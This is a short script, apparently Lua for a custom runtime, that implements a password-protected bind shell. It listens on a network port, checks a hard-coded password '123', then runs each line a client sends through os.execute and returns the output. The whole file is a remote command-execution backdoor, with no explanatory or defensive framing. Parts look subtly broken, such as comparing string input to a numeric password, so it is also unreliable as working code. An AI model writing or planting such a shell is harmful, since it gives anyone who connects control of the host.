local count = 1
local authed = false
local password = 123
local port = os.getenv("PORT") or 31522

while true do
    local server = socket.server(port)
    if count == 1 then print("[+] listening at port " .. port) count = count + 1 end

    local client, i, o = socket.accept(server)
    local addr = socket.peer(client)
    print("[+] " .. addr .. " connected")
    io.write("Password: ", o)

    local function close() io.close(server) io.close(client) io.close(i) io.close(o) end

    while true do
        local payload = string.trim(io.read(i))

        if not authed then
            if payload == password then
                authed = true
            else
                print("[-] " .. addr .. " -- auth failed")
                io.write("Bad credentials!", o) break
            end
        elseif payload == "/exit" then break
        elseif payload == "/addr" then io.write(addr, o)
        elseif payload == "/close" then close()
        else
            print("[+] " .. addr .. " -> " .. payload)
            local before = io.read()
            os.execute(payload)
            local after = io.read()

            io.write(string.sub(after, #before + 2, #after), o)
        end
    end
    print("[-] " .. addr .. " disconnected")
    close()
end